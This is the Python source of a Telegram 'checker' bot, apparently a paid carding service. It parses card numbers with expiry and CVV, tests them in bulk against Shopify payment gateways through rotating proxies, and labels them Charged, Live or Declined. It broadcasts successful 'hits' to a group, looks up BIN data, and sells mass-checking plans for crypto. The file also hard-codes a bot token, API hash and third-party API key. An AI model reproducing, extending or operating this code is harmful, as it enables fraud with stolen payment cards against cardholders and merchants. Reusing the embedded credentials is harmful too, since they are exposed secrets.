# ============================================================
#  Marin Bot — FINAL bot.py
# ============================================================
import asyncio, aiohttp, aiofiles, os, random, time, json, re, string, sys
import requests, uuid, base64, hashlib, logging, urllib.parse, html as _html
from datetime import datetime, timedelta, timezone
from telethon import TelegramClient, events, Button
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError, ChatAdminRequiredError
from urllib.parse import urlparse, quote, urlunparse, unquote, parse_qs

from check_engine import (
    check_card_with_retry as _engine_check_retry,
    test_proxy as _engine_test_proxy,
    test_site as _engine_test_site,
    get_proxy_ip as _engine_get_proxy_ip,
    clear_session_bad_sites,
    clear_error_log,
    _proxy_to_url,
    _call_api as _engine_call_api,
)

import jio_hitter
import payglocal

API_ID = 36879858
API_HASH = "31edb415db51ac8be94379cdb9bcb236"
BOT_TOKEN = "8340712073:AAGRj5Ndnwa_ZpsJbR6LYwOZ0w0GbLxK9YQ"
OWNER_ID = 8032246466
ADMIN_IDS = [OWNER_ID]

BOT_LINK = "https://t.me/CHECKERBOT"
BOT_ICON = f'<a href="{BOT_LINK}">[❆]</a>'

DEV_USERNAME = "ishaniCarder"
OWNER_USERNAME = "ishaniCarder"
SUPPORT_USERNAME = "ishaniCarder"

HIT_GROUP_ID = -1002327585121
LOGS_CHANNEL_ID = -1002294975792
CHAT_GROUP_ID = -1002327585121
AUTO_PIN_CHARGED = True

FORCE_JOIN_CHANNELS = [
    {"id": LOGS_CHANNEL_ID, "name": "Logs", "url": "https://t.me/YOURRNAGI"},
    {"id": HIT_GROUP_ID, "name": "Hits", "url": "https://t.me/YOURRRNAGI"},
    {"id": CHAT_GROUP_ID, "name": "Chats", "url": "https://t.me/YOURRRNAGI"},
]

WELCOME_IMAGE_PATH = "start.gif"
SELF_DESTRUCT_KEY = "IamGoneFuckIt"

VBV_API_URL = "https://vbv.nikhilkhokhar.com/gateway=bin"
VBV_API_KEY = "rockysoon"
VBV_COOLDOWN_SECONDS = 10
_vbv_cooldown = {}

WALLET_ADDRESS = "YOUR_USDT_TRC20_WALLET_ADDRESS"
WALLET_NETWORK = "USDT (TRC20)"

PLAN_PRICES = {
    "Trial":    {"price": 2.00,  "days": 1,  "plan": "Core"},
    "Silver":   {"price": 7.00,  "days": 7,  "plan": "Core"},
    "Gold":     {"price": 14.00, "days": 15, "plan": "Elite"},
    "Platinum": {"price": 25.00, "days": 30, "plan": "Elite"},
    "Diamond":  {"price": 50.00, "days": 70, "plan": "Root"},
}

PREMIUM_FILE = 'premium.txt'
SITES_1_5_FILE = 'sites_1_5.txt'
SITES_10_20_FILE = 'sites_10_20.txt'
KEYS_FILE = 'keys.json'
BANNED_FILE = 'banned.txt'
FEEDBACK_FILE = 'feedback.json'
BOT_STATUS_FILE = 'bot_status.json'
USER_PLANS_FILE = 'user_plans.json'
CREDITS_FILE = 'credits.json'
KILL_SWITCH_FILE = 'kill_switch.json'
GATE_STATE_FILE = 'gate_state.json'
PROXY_DIR = 'proxies'
PROOFS_DIR = 'proofs'
os.makedirs(PROXY_DIR, exist_ok=True)
os.makedirs(PROOFS_DIR, exist_ok=True)

_pending_proof = {}
_pending_reject = {}

logging.basicConfig(level=logging.WARNING)
bot = None


def is_admin(user_id):
    return user_id in ADMIN_IDS


# ══════════════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════════════
_shared_session = None


def get_shared_session():
    global _shared_session
    if _shared_session is None or _shared_session.closed:
        connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=300, enable_cleanup_closed=True)
        _shared_session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=20),
            raise_for_status=False,
        )
    return _shared_session


_TG_SEND_SLOTS = asyncio.Semaphore(25)
_API_SLOTS = asyncio.Semaphore(64)


async def _send_with_flood_retry(coro_factory, label="send"):
    for attempt in range(3):
        async with _TG_SEND_SLOTS:
            try:
                return await coro_factory()
            except asyncio.CancelledError:
                raise
            except Exception as e:
                wait = getattr(e, "seconds", None)
                if wait and attempt < 2:
                    logging.warning("[%s] FLOOD_WAIT %ss", label, wait)
                    await asyncio.sleep(min(int(wait) + 1, 60))
                    continue
                raise
    return None


async def tg_send_message(chat, text, **kwargs):
    return await _send_with_flood_retry(lambda: bot.send_message(chat, text, **kwargs), "send_message")


async def tg_send_file(chat, **kwargs):
    return await _send_with_flood_retry(lambda: bot.send_file(chat, **kwargs), "send_file")


async def tg_edit_message(message, text, **kwargs):
    return await _send_with_flood_retry(lambda: message.edit(text, **kwargs), "edit")


# ══════════════════════════════════════════════════════════════
#  USERNAME FORMATTER
# ══════════════════════════════════════════════════════════════
def _escape(s):
    return _html.escape(str(s), quote=False)


def format_username(username=None, user_id=None, display=None):
    uname = None
    if username:
        uname = str(username).lstrip("@").strip()
        if not re.fullmatch(r"[A-Za-z0-9_]{3,64}", uname):
            uname = None
    if uname:
        return f'<a href="https://t.me/{_escape(uname)}">{_escape(uname)}</a>'
    if user_id:
        try:
            return f'<a href="tg://user?id={int(user_id)}">{_escape(display or "User")}</a>'
        except Exception:
            pass
    return _escape(display or "User")


def dev_link():
    return format_username(username=DEV_USERNAME, display="𝑰𝒔𝒉𝒂𝒏𝒊")


def owner_link():
    return format_username(username=OWNER_USERNAME, display="𝑰𝒔𝒉𝒂𝒏𝒊")


def support_link():
    return format_username(username=SUPPORT_USERNAME, display="𝑰𝒔𝒉𝒂𝒏𝒊")


# ══════════════════════════════════════════════════════════════
#  CUSTOM EMOJI
# ══════════════════════════════════════════════════════════════
E = {
    "✅":"5332533929020761310", "❌":"4956232383721374836",
    "🟢":"5287687594207891363", "🔴":"5287687594207891363",
    "⚠️":"6154263010715111980", "💔":"5307710821936145414",
    "⚡":"5852963014721933483", "🔥":"6129418815341077483",
    "💥":"5122933683820430249",
    "💎":"5976721857406048634", "💰":"4965219701572503640",
    "👑":"5787412175878361514", "🆓":"5116382939571028928",
    "🎯":"5287547831677112267", "🌟":"5287547831677112267",
    "⭐":"5039644681583985437", "⭐️":"5852459292367523344",
    "🎀":"5384215445373282968",
    "🚩":"5350291836378307462", "🏪":"6044260346984665434",
    "👋":"5411285122215332752", "🆔":"6035239240625820254",
    "📌":"6154668949549092628", "▶️":"5444883062234053429",
    "⚙️":"5325872701032635449", "📄":"6044201012011471041",
    "💳":"5447453226498552490", "💠":"5325822763447884498",
    "📝":"5444860552310457690", "🌐":"5447381715293074599",
    "📊":"4958506272551863292", "☠️":"5201885018196033330",
    "📋":"5447460764166158313", "⏳":"5215327832040811010",
    "🚀":"5440841102871517055", "💡":"5852795412213140906",
    "📈":"5134457377428341766", "🔢":"5920231922088283328",
    "🔔":"6129652186684070216", "🔍":"5305346287820895195",
    "⏱️":"6334603778326529773", "📩":"5409186957676785646",
    "👤":"4913497231492908158", "📅":"4904936030232117798",
    "🔄":"5307780589384900520", "🏦":"6318864007381911770",
    "🌍":"5287292843763713628", "🔗":"4958689671950369798",
    "📱":"6154589436819541960", "🔐":"5258476306152038031",
    "📢":"6172513793784857602", "👥":"5197593250650680436",
    "🦋":"6044262726396546853", "🎖️":"5122968327026640636",
    "🚪":"5447592907424955482",
    "🙂":"5852552166740332584", "💗":"5332533929020761310",
    "💝":"5328312053478202282",
    "➡️":"5447181973544008180",
    "🪙":"4965219701572503640",
    "↕️":"5445088739627924307",
    "🔒":"5429405838345265327",
    "🎖":"5377445293933469655",
}
_PREMIUM_EMOJI_RE = re.compile("|".join(re.escape(e) for e in sorted(E, key=len, reverse=True)))


def _render_premium_emoji(text, emoji_ids, emoji_re=None):
    if not text:
        return text
    matcher = emoji_re or re.compile("|".join(re.escape(e) for e in sorted(emoji_ids, key=len, reverse=True)))

    def _sub(m):
        emoji = m.group(0)
        eid = emoji_ids.get(emoji)
        if not eid:
            return emoji
        eid_str = str(eid).strip()
        if not eid_str.isdigit():
            return emoji
        return f'<tg-emoji emoji-id="{eid_str}">{emoji}</tg-emoji>'

    return matcher.sub(_sub, str(text))


def premium_emoji(text):
    if not text:
        return text
    if '<tg-emoji' in str(text):
        return text
    return _render_premium_emoji(text, E, _PREMIUM_EMOJI_RE)


def premium_icon(emoji):
    try:
        return int(E[emoji])
    except (KeyError, TypeError, ValueError):
        return None


# ══════════════════════════════════════════════════════════════
#  PLAN SYSTEM
# ══════════════════════════════════════════════════════════════
PLAN_LIMITS = {
    "Free":{"mass":0, "single":True, "proxy":False, "workers":5},
    "Core":{"mass":1000, "single":True, "proxy":True, "workers":10},
    "Elite":{"mass":5000, "single":True, "proxy":True, "workers":20},
    "Root":{"mass":999999, "single":True, "proxy":True, "workers":30},
}
VALID_PLANS = ["Core", "Elite", "Root"]
PLAN_DAYS = {"Core":1, "Elite":15, "Root":30}


def load_json_file(fp, default=None):
    if default is None:
        default = {}
    if not os.path.exists(fp):
        return default
    try:
        with open(fp, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return default


def save_json_file(fp, data):
    with open(fp, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)


def get_bot_status():
    return load_json_file(BOT_STATUS_FILE, {'status':'on'}).get('status', 'on')


def set_bot_status(s):
    save_json_file(BOT_STATUS_FILE, {'status':s})


def get_file_lines(fp):
    if not os.path.exists(fp):
        return []
    try:
        with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return []


def load_banned():
    return get_file_lines(BANNED_FILE)


def is_banned(uid):
    return str(uid) in load_banned()


def load_premium_users():
    return list(dict.fromkeys(get_file_lines(PREMIUM_FILE)))


def is_premium(uid):
    return str(uid) in load_premium_users()


def load_sites_1_5():
    return get_file_lines(SITES_1_5_FILE)


def load_sites_10_20():
    return get_file_lines(SITES_10_20_FILE)


def is_killed():
    return load_json_file(KILL_SWITCH_FILE, {}).get("killed", False)


def set_killed(flag=True):
    save_json_file(KILL_SWITCH_FILE, {"killed":flag, "at":datetime.now().isoformat()})


def gate_enabled(gate="shopify"):
    return load_json_file(GATE_STATE_FILE, {}).get(gate, True)


def set_gate(gate, enabled):
    d = load_json_file(GATE_STATE_FILE, {})
    d[gate] = enabled
    save_json_file(GATE_STATE_FILE, d)


def set_user_plan(user_id, plan, days=0, hours=0, minutes=0):
    if plan not in PLAN_LIMITS:
        return False
    if days == 0 and hours == 0 and minutes == 0:
        return False
    plans = load_json_file(USER_PLANS_FILE, {})
    delta = timedelta(days=days, hours=hours, minutes=minutes)
    expires = (datetime.now() + delta).isoformat()
    plans[str(user_id)] = {"plan":plan, "expires_at":expires, "set_at":datetime.now().isoformat()}
    save_json_file(USER_PLANS_FILE, plans)
    return True


def get_user_plan(user_id):
    if is_admin(user_id):
        return "Root"
    plans = load_json_file(USER_PLANS_FILE, {})
    uid = str(user_id)
    if uid not in plans:
        return "Free"
    data = plans[uid]
    if not isinstance(data, dict):
        return "Free"
    exp = data.get("expires_at")
    if exp:
        try:
            exp_dt = datetime.fromisoformat(exp)
            if exp_dt < datetime.now():
                expired_plan = data.get("plan", "Unknown")
                del plans[uid]
                save_json_file(USER_PLANS_FILE, plans)
                try:
                    pu = load_premium_users()
                    if uid in pu:
                        pu = [x for x in pu if x != uid]
                        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
                            for x in pu:
                                f.write(f"{x}\n")
                except Exception:
                    pass
                try:
                    loop = asyncio.get_event_loop()
                    if loop.is_running():
                        asyncio.create_task(send_expiry_notice(user_id, expired_plan))
                except Exception as e:
                    logging.warning(f"Could not queue expiry notice: {e}")
                return "Free"
        except Exception as e:
            logging.warning(f"Plan expire check failed for {uid}: {e}")
    return data.get("plan", "Free")


def get_mass_limit(user_id):
    return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("mass", 0)


def can_use_proxy(user_id):
    return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("proxy", False)


def get_worker_count(user_id):
    return PLAN_LIMITS.get(get_user_plan(user_id), {}).get("workers", 5)


def parse_duration(text):
    text = str(text).strip().lower()
    if not text:
        return None
    if text.isdigit():
        return (int(text), 0, 0)
    matches = re.findall(r'(\d+)\s*([dhm])', text)
    if not matches:
        return None
    consumed = ''.join(f"{n}{u}" for n, u in matches)
    if consumed != text.replace(' ', ''):
        return None
    days = hours = minutes = 0
    for n, u in matches:
        n = int(n)
        if u == 'd':
            days += n
        elif u == 'h':
            hours += n
        elif u == 'm':
            minutes += n
    if days == 0 and hours == 0 and minutes == 0:
        return None
    return (days, hours, minutes)


def format_duration(days, hours, minutes):
    parts = []
    if days:
        parts.append(f"{days}d")
    if hours:
        parts.append(f"{hours}h")
    if minutes:
        parts.append(f"{minutes}m")
    return " ".join(parts) if parts else "0m"


DEFAULT_CREDITS = 50


def get_credits(user_id):
    if is_admin(user_id):
        return 999999999
    c = load_json_file(CREDITS_FILE, {})
    uid = str(user_id)
    if uid not in c:
        c[uid] = DEFAULT_CREDITS
        save_json_file(CREDITS_FILE, c)
    return c[uid]


def set_credits(user_id, amount):
    c = load_json_file(CREDITS_FILE, {})
    c[str(user_id)] = max(0, int(amount))
    save_json_file(CREDITS_FILE, c)


def deduct_credits(user_id, amount=1):
    if is_admin(user_id):
        return True
    cur = get_credits(user_id)
    if cur < amount:
        return False
    set_credits(user_id, cur - amount)
    return True


def get_user_proxy_file(user_id, gate="shopify"):
    return os.path.join(PROXY_DIR, f"{user_id}_{gate}.txt")


def load_user_proxies(user_id, gate="shopify"):
    return get_file_lines(get_user_proxy_file(user_id, gate))


def save_user_proxies(user_id, proxies, gate="shopify"):
    with open(get_user_proxy_file(user_id, gate), 'w', encoding='utf-8') as f:
        for p in proxies:
            f.write(f"{p}\n")


def get_proxies_for_check(user_id, gate="shopify"):
    return load_user_proxies(user_id, gate)


def normalize_proxy(p):
    p = (p or '').strip()
    if not p:
        return None
    url = _proxy_to_url(p)
    if not url:
        return None
    try:
        u = urlparse(url)
        if u.username and u.password and u.hostname and u.port:
            return f"{u.hostname}:{u.port}:{u.username}:{u.password}"
        if u.hostname and u.port:
            return f"{u.hostname}:{u.port}"
    except Exception:
        pass
    return None


async def test_proxy(proxy):
    try:
        result = await _engine_test_proxy(proxy)
        return result.get('status') == 'alive'
    except Exception:
        return False


def generate_key(n=16):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))


def generate_order_id():
    return "ORD-" + generate_key(8).upper()


def mask_mobile(mobile):
    s = str(mobile)
    if len(s) <= 3:
        return s
    return s[:3] + "X" * (len(s) - 3)


def extract_cc(text):
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{cv}" for c, m, y, cv in
            re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)]


async def read_replied_text_file(message):
    file_info = getattr(message, "file", None)
    if not file_info:
        return None, "❌ Reply to a .txt document."
    filename = str(getattr(file_info, "name", "") or "").strip()
    mime_type = str(getattr(file_info, "mime_type", "") or "").lower()
    if not filename.lower().endswith(".txt") and mime_type != "text/plain":
        return None, "❌ Reply to a .txt document."
    downloaded_path = None
    try:
        downloaded_path = await message.download_media()
        if not downloaded_path:
            return None, "❌ Could not download the file."
        async with aiofiles.open(downloaded_path, "r", encoding="utf-8", errors="ignore") as fh:
            return await fh.read(), None
    except Exception as exc:
        logging.warning("Text file read failed: %s", exc)
        return None, "❌ Could not read the file."
    finally:
        if downloaded_path:
            try:
                os.remove(downloaded_path)
            except OSError:
                pass


def mask_user_id(uid):
    s = str(uid)
    if len(s) <= 6:
        return s
    return s[:3] + "****" + s[-3:]


async def get_bin_info(card_number):
    try:
        bn = card_number[:6]
        s = get_shared_session()
        async with s.get(f'https://bins.antipublic.cc/bins/{bn}') as r:
            if r.status != 200:
                return ('-',)*7
            d = json.loads(await r.text())
            return (d.get('brand','-'), d.get('type','-'), d.get('level','-'),
                    d.get('bank','-'), d.get('country_name','-'),
                    d.get('country_code','-'), d.get('country_flag',''))
    except Exception:
        return ('-',)*7


async def get_checker_mention(user_id):
    try:
        ent = await bot.get_entity(user_id)
        uname = getattr(ent, "username", None)
        fname = getattr(ent, "first_name", None)
        return format_username(username=uname, user_id=user_id, display=fname or "User")
    except Exception:
        return format_username(user_id=user_id, display=mask_user_id(user_id))


async def save_user_stats(user_id, success=False):
    f = f"user_{user_id}.json"
    d = load_json_file(f, {})
    today = datetime.now().strftime("%Y-%m-%d")
    if d.get('today_date') != today:
        d['today_date'] = today
        d['today_charged'] = 0
    d['total_checks'] = d.get('total_checks', 0) + 1
    if success:
        d['successful_checks'] = d.get('successful_checks', 0) + 1
        d['today_charged'] = d.get('today_charged', 0) + 1
    d['last_seen'] = datetime.now().isoformat()
    save_json_file(f, d)


async def create_user_if_not_exists(user_id, username):
    f = f"user_{user_id}.json"
    if not os.path.exists(f):
        save_json_file(f, {
            'user_id': user_id, 'username': username,
            'registered_at': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'total_checks': 0, 'successful_checks': 0,
            'today_charged': 0,
            'today_date': datetime.now().strftime("%Y-%m-%d")
        })


async def check_bot_status(event):
    if is_killed():
        return True
    return get_bot_status() == 'off' and not is_admin(event.sender_id)


async def check_banned(event):
    if is_killed():
        return True
    return is_banned(event.sender_id) and not is_admin(event.sender_id)


def parse_vbv_card(card_string):
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pattern in patterns:
        match = re.match(pattern, card_string)
        if match:
            num, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return num, mm, yy, cvv
    return None


async def is_user_joined(user_id):
    if is_admin(user_id):
        return True
    if bot is None:
        return True
    for ch in FORCE_JOIN_CHANNELS:
        try:
            await bot(GetParticipantRequest(channel=ch["id"], participant=user_id))
        except UserNotParticipantError:
            return False
        except ChatAdminRequiredError:
            logging.warning(f"Bot not admin in {ch['name']}")
            continue
        except Exception as e:
            logging.warning(f"Join check failed for {ch['name']}: {e}")
            continue
    return True


async def enforce_force_join(event):
    uid = event.sender_id
    if is_admin(uid):
        return True
    if is_killed():
        return True
    joined = await is_user_joined(uid)
    if joined:
        return True
    text = premium_emoji(
        "🚫 <b>You Unable To Use This Bot</b>\n"
        "\n"
        "<b>Because You Didn't Join Channel/Group</b> ▶️\n"
        "\n"
        "/start <b>To Join Channel And Use Bot</b> ▶️"
    )
    try:
        await event.reply(text, parse_mode='html')
    except Exception as e:
        logging.warning(f"Force-join message failed: {e}")
    return False


def get_force_join_keyboard():
    return [
        [Button.url("JOIN HITS", FORCE_JOIN_CHANNELS[1]["url"], style="primary", icon=premium_icon("🔗")),
         Button.url("JOIN CHATS", FORCE_JOIN_CHANNELS[2]["url"], style="primary", icon=premium_icon("🔗"))],
        [Button.inline("VERIFY", b"verify_join", style="success", icon=premium_icon("✅"))],
    ]


# ══════════════════════════════════════════════════════════════
#  PAYMENT HELPERS
# ══════════════════════════════════════════════════════════════
def save_manual_payment(order_id, user_id, plan_name, amount, days, plan_internal):
    payments = load_json_file('payments.json', {})
    payments[order_id] = {
        "user_id": user_id,
        "plan_name": plan_name,
        "plan_internal": plan_internal,
        "amount": amount,
        "days": days,
        "status": "pending",
        "created_at": time.time(),
    }
    save_json_file('payments.json', payments)


def update_payment_status(order_id, status, by_admin=None):
    payments = load_json_file('payments.json', {})
    if order_id in payments:
        payments[order_id]["status"] = status
        payments[order_id]["updated_at"] = time.time()
        if by_admin:
            payments[order_id]["approved_by"] = by_admin
        save_json_file('payments.json', payments)
        return payments[order_id]
    return None


# ══════════════════════════════════════════════════════════════
#  BOT INIT (must be after all helpers)
# ══════════════════════════════════════════════════════════════
bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
# ══════════════════════════════════════════════════════════════
#  UI BUILDERS
# ══════════════════════════════════════════════════════════════
def build_main_menu_text(user_id, sender=None):
    plan = get_user_plan(user_id)
    is_paid = plan != "Free"
    try:
        if sender and sender.username:
            name_line = format_username(username=sender.username)
        elif sender and sender.first_name:
            name_line = format_username(user_id=user_id, display=sender.first_name)
        else:
            name_line = format_username(user_id=user_id, display="User")
    except Exception:
        name_line = format_username(user_id=user_id, display="User")

    if is_paid:
        plans_data = load_json_file(USER_PLANS_FILE, {}).get(str(user_id), {})
        exp = plans_data.get("expires_at", "")
        time_left = "-"
        if exp:
            try:
                exp_dt = datetime.fromisoformat(exp)
                secs = int((exp_dt - datetime.now()).total_seconds())
                if secs <= 0:
                    time_left = "Expired"
                elif secs < 3600:
                    time_left = f"{secs // 60} Minutes"
                elif secs < 86400:
                    time_left = f"{secs // 3600} Hours"
                else:
                    time_left = f"{secs // 86400} Days"
            except Exception:
                pass
        proxies_personal = len(load_user_proxies(user_id, "shopify"))
        sites_global = len(load_sites_1_5()) + len(load_sites_10_20())
        text = (
            "⚡ <b>Welcome to Marin v2.0</b>\n"
            "\n"
            "📝 <b>Your premium environment is ready.</b>\n"
            "\n"
            "💠 <b>Profile</b>\n"
            "<blockquote>"
            f"👤 <b>User:</b> {name_line}\n"
            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
            "🎖 <b>Role:</b> ⚡ <b>Premium</b>\n"
            f"📅 <b>Plan:</b> <b>{time_left}</b>"
            "</blockquote>\n"
            "\n"
            "🌐 <b>Resources</b>\n"
            "<blockquote>"
            f"🔗 <b>Proxies:</b> <b>{proxies_personal} personal · 4748 global</b>\n"
            f"🌍 <b>Sites:</b> <b>0 personal · {sites_global} global</b>"
            "</blockquote>\n"
            "\n"
            "💳 <i>Want to top-up or renew? Just send /pay for automated crypto checkout!</i>"
        )
        return premium_emoji(text)

    text = (
        "⚡ <b>Welcome to Marin Checker</b>\n"
        "\n"
        "📧 𝑷𝒐𝒘𝒆𝒓𝒇𝒖𝒍, 𝒇𝒂𝒔𝒕, 𝒂𝒏𝒅 𝒓𝒆𝒍𝒊𝒂𝒃𝒍𝒆 𝒄𝒂𝒓𝒅 𝒄𝒉𝒆𝒄𝒌𝒊𝒏𝒈\n"
        "\n"
        "💠 <b>Account Status</b>\n"
        "<blockquote>"
        f"👤 <b>User:</b> {name_line}\n"
        f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
        "🎖 <b>Role:</b> 🔒 𝐔𝐧𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝\n"
        "📅 <b>Plan:</b> <b>No active plan — purchase access below.</b>"
        "</blockquote>\n"
        "\n"
        "🌐 <b>Next Steps</b>\n"
        "<blockquote>"
        "💰 <b>Plans:</b> <b>Click Buy Premium below</b>\n"
        "💳 <b>Auto-Pay:</b> <b>Type /pay for instant crypto delivery</b>"
        "</blockquote>"
    )
    return premium_emoji(text)


def get_main_keyboard(user_id=None):
    plan = get_user_plan(user_id) if user_id else "Free"
    is_paid = plan != "Free"
    if is_paid:
        return [
            [Button.inline("Check Card", b"menu_check", style="primary", icon=premium_icon("💳")),
             Button.inline("Gateways", b"menu_gate", style="primary", icon=premium_icon("🏪"))],
            [Button.inline("Sites", b"pxy_sites", style="primary", icon=premium_icon("🌐")),
             Button.inline("Proxies", b"pxy_list", style="primary", icon=premium_icon("🔗"))],
            [Button.inline("Gen / BIN", b"menu_bin", style="primary", icon=premium_icon("🔢")),
             Button.inline("My Stats", b"menu_stats", style="primary", icon=premium_icon("📊"))],
            [Button.inline("Users", b"menu_users", style="primary", icon=premium_icon("👥")),
             Button.inline("Help", b"menu_help", style="primary", icon=premium_icon("💡"))],
            [Button.inline("Buy / Auto-Pay", b"menu_buy", style="success", icon=premium_icon("💎"))],
        ]
    return [
        [Button.inline("Get Access", b"menu_buy", style="success", icon=premium_icon("🚀"))],
        [Button.url("Message Owner", f"https://t.me/{DEV_USERNAME}", style="primary", icon=premium_icon("👑"))],
    ]


def get_gate_menu_text():
    return premium_emoji("⚡ <b>Select A Gate</b> ⚡")


def get_gate_menu_keyboard():
    return [
        [Button.inline("Charge", b"gate_charge", style="primary", icon=premium_icon("💎")),
         Button.inline("Auth", b"gate_auth", style="primary", icon=premium_icon("✅"))],
        [Button.inline("« Back To Main Menu", b"main_menu", style="danger")],
    ]


def get_buy_menu_text():
    return premium_emoji(
        "💡 <b>Marin Premium Plans</b>\n"
        "\n"
        "📝 <b>Upgrade your access for mass checking.</b>\n"
        "\n"
        "💠 <b>Available Tiers</b>\n"
        "<blockquote>"
        "🎖 <b>TRIAL (1 Day)</b> ⇾ <b>$2.00</b>\n"
        "🥈 <b>SILVER (7 Days)</b> ⇾ <b>$7.00</b>\n"
        "🥇 <b>GOLD (15 Days)</b> ⇾ <b>$14.00</b>\n"
        "🏆 <b>PLATINUM (1 Mo)</b> ⇾ <b>$25.00</b>\n"
        "💎 <b>DIAMOND (70 Days)</b> ⇾ <b>$50.00</b>"
        "</blockquote>\n"
        "\n"
        "💸 <b>Select your payment method below to continue:</b>\n"
        "💡 <b>Tip: Need a custom plan? Type</b> <code>/pay 5</code> <b>(for 4 Days) or</b> <code>/pay 10</code>"
    )


def get_buy_menu_keyboard():
    return [
        [Button.inline("Pay securely with Crypto", b"buy_crypto", style="success", icon=premium_icon("💳"))],
        [Button.url("Binance Pay / UPI (Manual)", f"https://t.me/{DEV_USERNAME}", style="primary", icon=premium_icon("💎"))],
        [Button.url("Contact Admin", f"https://t.me/{DEV_USERNAME}", style="primary", icon=premium_icon("💎"))],
        [Button.inline("« Back to Menu", b"main_menu", style="danger")],
    ]


MASS_SESSIONS = {}


async def build_mass_progress(ar, plan, gateway="Shopify"):
    elapsed = time.time() - ar['start_time']
    mins, secs = divmod(int(elapsed), 60)
    hours, mins = divmod(mins, 60)
    if hours:
        time_str = f"{hours}h {mins}m {secs}s"
    elif mins:
        time_str = f"{mins}m {secs}s"
    else:
        time_str = f"{secs}s"
    text = (
        "💔 <b>Checking</b>\n"
        "\n"
        f"💎 <b>Charged:</b> <b>{len(ar['charged'])}</b>\n"
        f"✅ <b>Live:</b> <b>{len(ar.get('live', []))}</b>\n"
        f"🔐 <b>3D Auth:</b> <b>{len(ar.get('3ds', []))}</b>\n"
        f"❌ <b>Declined:</b> <b>{len(ar['dead'])}</b>\n"
        f"💀 <b>Errors:</b> <b>{len(ar['error'])}</b>\n"
        f"🔄 <b>Retried:</b> <b>{ar.get('retried', 0)}</b>\n"
        f"⏳ <b>Time Taken:</b> <b>{time_str}</b>\n"
        "\n"
        f"📊 <b>Processed:</b> <b>{ar['checked']}/{ar['total']}</b>"
    )
    return mass_premium_emoji(text)


def get_mass_keyboard():
    return [[Button.inline("Stop", b"mass_stop", style="danger", icon=premium_icon("🔴"))]]


async def send_hit_to_group(user_id, card, message, gateway, hit_type, price="1 USD"):
    if not HIT_GROUP_ID or HIT_GROUP_ID == -1001234567890:
        return
    if hit_type == "Approved" and not is_real_approved(message):
        return
    try:
        try:
            ent = await bot.get_entity(user_id)
            uname = getattr(ent, "username", None)
            fname = getattr(ent, "first_name", None)
            user_link = format_username(username=uname, user_id=user_id, display=fname or "User")
        except Exception:
            user_link = format_username(user_id=user_id, display="User")
        price_clean = str(price).replace('$','').replace('USD','').strip()
        price_display = price_clean if price_clean and price_clean not in ('-','0','0.00','0.0','None') else "0.1"
        response_val = {"Charged":"Charged","Live":"Live","Approved":"Approved"}.get(hit_type, hit_type)
        hit_msg = (
            "#Shopify Hit Found\n"
            "\n"
            f"<b>Response</b> ➡️ <code>{response_val}</code>\n"
            f"<b>Amount</b> ➡️ <b>{price_display}</b>\n"
            f"<b>User</b> ➡️ {user_link} ☑️"
        )
        await tg_send_message(HIT_GROUP_ID, premium_emoji(hit_msg), parse_mode='html', link_preview=False)
    except Exception as e:
        logging.warning(f"Hit group send failed: {e}")


async def send_check_result(user_id, card, status, message, gateway, price, elapsed, checker_name):
    try:
        bin_info = await get_bin_info(card.split('|')[0])
        brand, ctype, level, bank, country, ccode, flag = bin_info
        bin_num = card.split('|')[0][:6]
        bank_clean = str(bank).replace(" - DEBIT", "").replace(" - CREDIT", "").strip()
        price_str = str(price).strip()
        if price_str and price_str not in ('-','0','0.00','0.0','None',''):
            price_display = price_str
        else:
            price_display = "N/A"
        card_esc = _html.escape(str(card), quote=False)
        bank_esc = _html.escape(str(bank_clean), quote=False)
        ctype_esc = _html.escape(str(ctype), quote=False)
        country_esc = _html.escape(str(country), quote=False)
        if status == "Charged":
            tag = "#Charged #Shopify"
        elif status in ("Approved", "Live"):
            tag = "#Live #Shopify"
        elif status == "Error":
            tag = "#Error #Shopify"
        else:
            tag = "#Declined #Shopify"
        bank_line = f"{bank_esc} - {ctype_esc.upper()}" if ctype_esc and ctype_esc != '-' else bank_esc
        response_clean = str(message)[:80] if message else "No response"
        resp_e = _html.escape(response_clean, quote=False)
        result_msg = (
            f"<b>{tag}</b>\n"
            "\n"
            f"<b>Card</b> ➡️ <code>{card_esc}</code>\n"
            f"<b>Response</b> ➡️ <code>{resp_e}</code>\n"
            f"<b>Amount</b> ➡️ <code>{price_display}</code>\n"
            f"<b>Bin</b>  ➡️ <code>{bin_num}</code>\n"
            f"<b>Bank</b> ➡️ <code>{bank_esc}</code>\n"
            f"<b>Country</b> ➡️ <code>{country_esc}</code>\n"
            "---------------------------\n"
            f"<b>Dev</b> ➡️ {dev_link()}"
        )
        sent = await tg_send_message(user_id, premium_emoji(result_msg), parse_mode='html', link_preview=False)
        if status == "Charged" and AUTO_PIN_CHARGED and sent:
            try:
                await bot.pin_message(user_id, sent.id, notify=False)
            except Exception:
                pass
    except Exception as e:
        logging.warning(f"Check result send failed: {e}")


